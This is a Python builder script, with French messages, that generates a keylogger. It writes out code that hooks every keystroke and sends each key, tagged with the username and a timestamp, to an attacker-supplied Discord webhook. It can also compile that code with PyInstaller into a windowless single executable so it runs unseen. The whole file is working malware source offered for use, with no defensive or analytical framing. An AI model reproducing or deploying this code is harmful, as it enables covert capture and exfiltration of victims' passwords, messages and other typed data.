import os
import sys
import subprocess

KEYLOGGER_CODE_TEMPLATE = '''
import os
import keyboard
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

WEBHOOK_URL = "{webhook}"

class Keylogger:
    def __init__(self, webhook_url=WEBHOOK_URL):
        self.webhook_url = webhook_url
        self.username = os.getlogin()

    def _format_key(self, key_name: str) -> str:
        specials = {{
            'space': ' ',
            'enter': '\\n',
            'decimal': '.',
            'tab': '[TAB]',
            'backspace': '[BACKSPACE]',
            'shift': '[SHIFT]',
            'ctrl': '[CTRL]',
            'alt': '[ALT]',
            'caps lock': '[CAPSLOCK]',
            'esc': '[ESC]',
            'delete': '[DEL]',
            'up': '[UP]',
            'down': '[DOWN]',
            'left': '[LEFT]',
            'right': '[RIGHT]',
        }}
        if key_name.lower() == 'esc':
            return 'esc'
        if len(key_name) == 1:
            return key_name.lower()
        return specials.get(key_name.lower(), '[' + key_name.upper() + ']')

    def send_key(self, key_str: str):
        now = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        content = "Keylogger - " + self.username + " @ " + now + ": " + key_str
        webhook = DiscordWebhook(url=self.webhook_url)
        embed = DiscordEmbed(title="Key Pressed", description=content, color=0x2ecc71)
        webhook.add_embed(embed)
        webhook.execute()

    def callback(self, event):
        if event.event_type == 'down':
            key = self._format_key(event.name)
            if key is not None:
                self.send_key(key)

    def start(self):
        print("[*] Keylogger démarré. Presse ESC pour quitter.")
        keyboard.hook(self.callback)
        keyboard.wait('esc')
        print("[*] Keylogger arrêté.")

if __name__ == '__main__':
    kl = Keylogger()
    kl.start()
'''

def create_py_file(webhook):
    filename = "keylogger_generated.py"
    if os.path.exists(filename):
        print(f"[WARN] Le fichier '{filename}' existe déjà, il sera écrasé.")
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(KEYLOGGER_CODE_TEMPLATE.format(webhook=webhook))
    print(f"[OK] Fichier '{filename}' créé avec le webhook intégré.")
    return filename

def create_exe(pyfile):
    print("[INFO] Création de l'exécutable avec PyInstaller...")
    try:
        subprocess.run([
            sys.executable,
            "-m",
            "PyInstaller",
            "--onefile",
            "--noconsole",
            pyfile
        ], check=True)
        print("[OK] Exécutable créé dans le dossier 'dist'.")
    except Exception as e:
        print(f"[ERROR] Erreur lors de la création de l'exécutable : {e}")

def main():
    print("="*40)
    print("           Keylogger Tool           ")
    print("="*40, "\n")

    webhook_url = input("🔗 Entrez le webhook Discord : ").strip()
    if not webhook_url:
        print("[ERROR] Webhook invalide, arrêt.")
        sys.exit(1)

    choice = input("💾 Créer un exécutable .exe ? (oui/non) : ").strip().lower()
    pyfile = create_py_file(webhook_url)

    if choice in ["oui", "o", "yes", "y"]:
        create_exe(pyfile)
    else:
        print("🎉 Terminé, fichier .py créé. Lance ce fichier pour démarrer le keylogger.")

if __name__ == "__main__":
    main()
